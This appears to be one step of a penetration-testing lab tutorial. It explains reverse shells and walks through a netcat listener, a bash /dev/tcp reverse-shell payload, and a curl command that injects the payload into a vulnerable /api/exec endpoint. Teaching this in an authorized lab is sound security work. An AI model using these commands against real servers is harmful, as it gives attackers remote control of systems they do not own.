# Step 6: Reverse Shell

In this step, we will explore how to establish a reverse shell connection to the vulnerable server. A reverse shell allows an attacker to gain remote access to a machine, executing commands as if they were physically present at the terminal.

## Prerequisites

Before proceeding, ensure you have completed the previous steps and have access to the vulnerable web application.

## Understanding Reverse Shells

A reverse shell is a type of shell where the target machine opens a connection to the attacker's machine, allowing the attacker to execute commands remotely. This is often used in penetration testing and can be exploited if the target has vulnerabilities that allow for command execution.

## Setting Up the Attacker's Listener

1. **Open your terminal.**
2. **Set up a listener on your local machine** to catch the reverse shell connection. You can use `netcat` (or `nc`) for this purpose. Run the following command:

   ```
   nc -lvnp <your_port>
   ```

   Replace `<your_port>` with a port number of your choice (e.g., 4444).

## Exploiting the Vulnerability

1. **Identify the vulnerable endpoint** in the web application that allows command execution. This is typically done through the `/api/exec` endpoint.
2. **Craft your payload** to establish a reverse shell. A common payload in a Linux environment is:

   ```
   bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1
   ```

   Replace `<your_ip>` with your local machine's IP address and `<your_port>` with the port you set up in the listener.

3. **Send the payload** to the vulnerable endpoint. You can use tools like `curl` or Postman to make a POST request to the `/api/exec` endpoint with your payload.

   Example using `curl`:

   ```
   curl -X POST http://<target_ip>/api/exec -d "command=bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1"
   ```

   Replace `<target_ip>` with the IP address of the vulnerable server.

## Gaining Access

If successful, you should see a connection established in your terminal where you set up the listener. You can now execute commands on the target server.

## Important Notes

- **Ethical Considerations**: Always ensure you have permission to test the systems you are working on. Unauthorized access is illegal and unethical.
- **Cleanup**: After completing your exercises, ensure to clean up any changes made to the server and close any open connections.

## Next Steps

In the next step, we will explore privilege escalation techniques specific to Ubuntu.